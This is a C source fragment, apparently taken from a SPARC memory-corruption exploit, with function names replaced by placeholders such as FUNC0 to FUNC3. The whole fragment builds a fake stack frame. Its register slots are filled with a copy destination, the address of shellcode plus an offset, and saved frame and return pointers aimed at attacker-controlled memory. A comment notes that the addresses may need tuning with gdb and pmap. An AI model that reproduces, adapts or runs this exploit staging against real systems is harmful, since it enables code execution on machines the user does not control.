#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 scalar_t__ FRAME_SIZE ; 
 long SHELLCODE_ADDR ; 
 int FUNC0 () ; 
 scalar_t__ FUNC1 (scalar_t__) ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 

char * FUNC3(long offset)
{
  long destcpy_addr;
  long *lp;
  char *frame = (char *)FUNC1(FRAME_SIZE + 1);

  if(!frame)
  {
    FUNC2("malloc");
    return 0;
  }

  /* this worked for me; may have to adjust though 
   * - can easily find a good place by using gdb and pmap */
  destcpy_addr = FUNC0() + 0x17000;

  lp = (long *)frame;
  
  /* %l regs - values don't matter */
  *lp++ = 0x42454746; /* %l0 <- == "BEGF", use this to help locate frame's address */
  *lp++ = 0xdeaddead; /* %l1 */
  *lp++ = 0xdeaddead; /* %l2 */
  *lp++ = 0xdeaddead; /* %l3 */
  *lp++ = 0xdeaddead; /* %l4 */
  *lp++ = 0xdeaddead; /* %l5 */
  *lp++ = 0xdeaddead; /* %l6 */
  *lp++ = 0xdeaddead; /* %l7 */

  /* %i regs */
  *lp++ = destcpy_addr;              /* %i0 - DESTINATION ADDRESS for ___cpy() */
  *lp++ = (SHELLCODE_ADDR + offset); /* %i1 - SOURCE ADDRESS for ___cpy() */
  *lp++ = 0xdeaddead;                /* %i2 - size*/
  *lp++ = 0xdeaddead;                /* %i3 */
  *lp++ = 0xdeaddead;                /* %i4 */
  *lp++ = 0xdeaddead;                /* %i5 */
  *lp++ = destcpy_addr+0x200;        /* saved frame pointer/%i6(sp) */
  *lp++ = destcpy_addr-0x8;          /* %i7 */
  *lp++ = 0x0;

  return frame;
}